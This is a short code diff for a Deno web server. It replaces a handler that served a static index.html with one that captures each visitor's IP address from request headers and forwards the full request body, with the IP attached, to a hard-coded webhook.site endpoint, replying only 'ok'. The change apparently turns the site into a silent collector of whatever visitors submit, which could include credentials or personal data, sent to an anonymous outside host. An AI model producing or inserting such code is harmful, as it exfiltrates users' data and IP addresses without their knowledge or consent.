@@ -1,5 +1,18 @@
-import { serveFile } from "jsr:@std/http/file-server";
+Deno.serve(async (req) => {
+  const ip = req.headers.get("cf-connecting-ip")
+           || req.headers.get("x-forwarded-for")
+           || "desconhecido"
 
-Deno.serve((req: Request) => {
-    return serveFile(req, "./index.html");
-});
+  const body = await req.text()
+
+  await fetch("https://webhook.site/8b1d7521-a8a9-4e5e-b23d-599a16aece34", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "X-Original-IP": ip,
+    },
+    body: body
+  })
+
+  return new Response("ok", { status: 200 })
+})
